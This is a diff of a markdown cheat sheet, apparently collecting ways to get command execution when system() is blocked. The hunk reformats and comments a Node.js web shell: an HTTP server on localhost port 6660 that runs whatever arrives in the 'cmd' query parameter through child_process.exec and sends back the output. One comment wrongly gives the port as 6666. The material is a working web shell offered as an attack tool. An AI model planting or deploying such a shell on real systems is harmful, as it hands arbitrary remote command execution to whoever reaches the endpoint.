@@ -38,32 +38,33 @@ sometimes `system()` function is blocked which can be bypassed via alternative f
 
 ##### exec
 ```JS
-var sys   = require('sys'),	//loading module
-    exec  = require('child_process').exec, //loading module
+var sys = require('sys'), //loading module
+    exec = require('child_process').exec, //loading module
     child,
-    http = require('http');	//loading module
-	
+    http = require('http'); //loading module
+
 //A function which returns command output with some error handeling
-child = function(res, cmd) {	//A function which returns command output
-  exec(cmd, 
-  function (error, stdout, stderr) {
-    res.end(stdout);
-    if (error !== null) {
-      console.log('exec error: ' + error);	//if error it will print error over log
-    }
-  });
+child = function(res, cmd) { //A function which returns command output
+    exec(cmd,
+        function(error, stdout, stderr) {
+            res.end(stdout);
+            if (error !== null) {
+                console.log('exec error: ' + error); //if error it will print error over log
+            }
+        });
 };
 
-http.createServer(function (req, res) {		//Main Function for HTTP service
-  res.writeHead(200, {'Content-Type': 'text/plain'});
-  var parsedRequest = require('url').parse(req.url, true);
-  var cmd = parsedRequest.query['cmd'];	//specifying parameter
-  if (cmd != undefined)
-  {
-    console.log("[cmd] " + cmd);
-    child(res, cmd);
-  }
-}).listen('6660', '127.0.0.1');	//Listeting on localhost:6666
+http.createServer(function(req, res) { //Main Function for HTTP service
+    res.writeHead(200, {
+        'Content-Type': 'text/plain'
+    }); // response header 
+    var parsedRequest = require('url').parse(req.url, true); //parsing request URL
+    var cmd = parsedRequest.query['cmd']; //specifying parameter
+    if (cmd != undefined) {
+        console.log("[cmd] " + cmd); // logging commands in console
+        child(res, cmd); // execution of function responsible to command execution
+    }
+}).listen('6660', '127.0.0.1'); //Listeting on localhost:6666
 ```
 
 ##### execFile
